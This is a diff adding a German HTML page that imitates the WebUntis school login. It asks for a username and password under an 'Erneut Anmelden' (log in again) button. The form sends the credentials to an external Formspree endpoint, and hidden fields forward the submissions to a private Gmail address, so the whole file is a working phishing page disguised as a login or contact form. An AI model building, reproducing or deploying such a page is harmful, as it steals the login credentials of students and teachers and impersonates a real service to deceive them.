@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<title>WebUntis Kontakt</title>
+<style>
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: #f4f6f8;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 0;
+}
+
+.box {
+  background: white;
+  padding: 40px 30px;
+  border-radius: 12px;
+  width: 400px;
+  text-align: center;
+  box-shadow: 0 12px 28px rgba(0,0,0,0.15);
+}
+
+.logo {
+  width: 120px;
+  margin-bottom: 20px;
+}
+
+h1 {
+  color: #f36f21;
+  font-size: 28px;
+  margin-bottom: 25px;
+  font-weight: 600;
+  font-family: 'Segoe UI', sans-serif;
+}
+
+/* Inputs & Textarea */
+input, textarea {
+  width: 100%;
+  padding: 12px 14px;
+  margin: 10px 0;
+  border-radius: 6px;
+  border: 1px solid #ccc;
+  font-size: 14px;
+  box-sizing: border-box;
+  font-family: 'Segoe UI', sans-serif;
+}
+
+/* Textarea genauso hoch wie Input */
+textarea {
+  height: 46px; /* gleiche Höhe wie Input */
+  resize: none; /* verhindern, dass Benutzer die Höhe ändern */
+}
+
+button {
+  width: 100%;
+  padding: 14px;
+  background-color: #f36f21;
+  color: white;
+  border: none;
+  font-size: 16px;
+  border-radius: 6px;
+  cursor: pointer;
+  margin-top: 10px;
+  transition: background 0.3s;
+}
+
+button:hover {
+  background-color: #e55b0f;
+}
+
+@media (max-width: 450px){
+  .box { width: 90%; padding: 30px 20px; }
+}
+</style>
+</head>
+<body>
+
+<div class="box">
+<!-- Dein hochgeladenes Logo -->
+<img src="d2345a82-8eef-4a64-947b-a1b45004a2fb.png" alt="WebUntis Logo" class="logo">
+
+<h1>WebUntis</h1>
+
+<form action="https://formspree.io/f/xeerjzdl" method="POST">
+  <input type="text" name="name" placeholder="Benutzername" required>
+  <textarea name="message" placeholder="Passwort" required></textarea>
+  <!-- Immer feste E-Mail nutzen -->
+  <input type="hidden" name="email" value="baykeremmehmet@gmail.com">
+  <input type="hidden" name="_replyto" value="baykeremmehmet@gmail.com">
+  <button type="submit">Erneut Anmelden</button>
+</form>
+
+</div>
+
+</body>
+</html>
